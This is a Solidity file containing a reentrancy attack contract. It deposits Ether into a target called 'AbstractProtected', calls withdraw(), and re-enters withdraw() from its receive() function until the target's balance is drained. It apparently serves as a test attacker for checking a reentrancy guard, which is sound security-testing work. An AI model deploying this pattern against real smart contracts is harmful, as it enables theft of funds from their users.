// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AbstractProtected.sol";

contract MaliciousContractForProt {
    AbstractProtected public abstractProtected;

    constructor(address _abstractProtectedAddress) {
        abstractProtected = AbstractProtected(_abstractProtectedAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(abstractProtected).balance > 0) {
            abstractProtected.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        abstractProtected.addBalance{value: msg.value}();
        abstractProtected.withdraw();
    }

    function getVictim() public view returns (address) {
        return address(abstractProtected);
    }
}
